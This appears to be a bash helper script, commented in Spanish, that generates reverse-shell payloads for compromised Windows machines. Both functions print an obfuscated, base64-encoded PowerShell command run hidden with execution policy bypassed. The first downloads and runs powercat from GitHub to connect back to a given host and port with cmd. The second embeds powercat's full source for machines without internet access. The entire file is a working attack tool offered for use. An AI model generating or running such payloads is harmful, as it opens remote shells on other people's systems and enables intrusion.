#!/bin/bash

#
# Reverse shell con powercat en caso de que la maquina comprometidad tenga acceso a internet y pueda descargar powercat
#

reverse-shell-powercat(){
echo -n "powershell -nOp -w hIDdeN -EP ByPaSs -e ";echo "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c $1 -p $2 -e cmd;" | iconv -t UTF-16LE | base64 | tr -d '\n';echo "";
}

#
# Reverse shell para maquinas que no tengan acceso a a internet, en esta metemos todo el codigo de powercat
#

reverse-shell-download-powercat(){
echo -n "powershell -nOp -w hIDdeN -EP ByPaSs -e ";
echo `curl -s https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1` 'powercat -c "$1" -p $2 -e cmd.exe' | iconv -t UTF-16LE | base64 | tr -d "\n"
}
